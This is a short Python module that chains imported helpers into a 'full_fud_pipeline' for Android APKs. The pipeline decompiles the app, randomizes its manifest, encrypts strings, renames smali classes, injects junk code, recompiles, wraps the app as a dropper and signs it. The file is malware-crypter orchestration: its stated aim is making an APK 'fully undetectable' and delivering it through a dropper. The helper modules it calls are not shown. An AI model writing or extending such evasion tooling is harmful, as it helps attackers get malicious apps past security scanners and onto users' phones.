from .apktool_wrapper import decompile, recompile
from .dex_mutator import mutate_smali
from .encryptor import encrypt_strings
from .manifest import randomize_manifest
from .junk_injector import inject_junk
from .dropper import wrap_as_dropper
from .signer import sign_apk
import os

def full_fud_pipeline(input_apk: str, output_apk: str, session_dir: str) -> str:
    decompiled_dir = os.path.join(session_dir, "decompiled")

    # Step 1: Decompile
    decompile(input_apk, decompiled_dir)

    # Step 2: Randomize Manifest (package name, permissions shuffle)
    randomize_manifest(decompiled_dir)

    # Step 3: Encrypt strings in smali
    encrypt_strings(decompiled_dir)

    # Step 4: Mutate smali (rename classes/methods/fields)
    mutate_smali(decompiled_dir)

    # Step 5: Inject junk classes
    inject_junk(decompiled_dir)

    # Step 6: Recompile
    unsigned_apk = os.path.join(session_dir, "unsigned.apk")
    recompile(decompiled_dir, unsigned_apk)

    # Step 7: Wrap as dropper
    dropped_apk = os.path.join(session_dir, "dropped.apk")
    wrap_as_dropper(unsigned_apk, dropped_apk, session_dir)

    # Step 8: Sign
    sign_apk(dropped_apk, output_apk)

    return output_apk